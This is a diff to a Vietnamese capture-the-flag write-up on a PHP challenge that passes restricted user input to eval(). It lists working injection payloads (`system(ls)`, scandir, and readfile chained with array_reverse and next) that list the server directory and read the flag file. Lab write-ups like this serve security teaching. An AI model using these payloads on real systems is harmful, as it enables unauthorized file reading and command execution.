@@ -26,4 +26,13 @@ else
 - Đề bài chỉ cho phép sử dụng các kí tự từ 'a' đến 'z', '(', ')', '_' và '.'
 - Do phần nội dung được nhập vào được thực thi bởi `eval()` nên có thể bị dính lỗi dạng code/command execution.
 - Thử với `system(ls)`:
-[./images/Selection_001.png]
+![system(ls)](./images/Selection_001.png)
+
+- Thay vì sử dụng command execution, ta có thể sử dụng dạng code execution: `print_r(scandir(getcwd()))`
+![scandir(getcwd())](./images/Selection_002.png)
+
+- Lấy tên file flag: `print_r(next(array_reverse(scandir(getcwd()))))`
+![get flag's filename](./images/Selection_003.png)
+
+- Đọc nội dung flag: `readfile(next(array_reverse(scandir(getcwd()))))`
+![flag](./images/Selection_004.png)
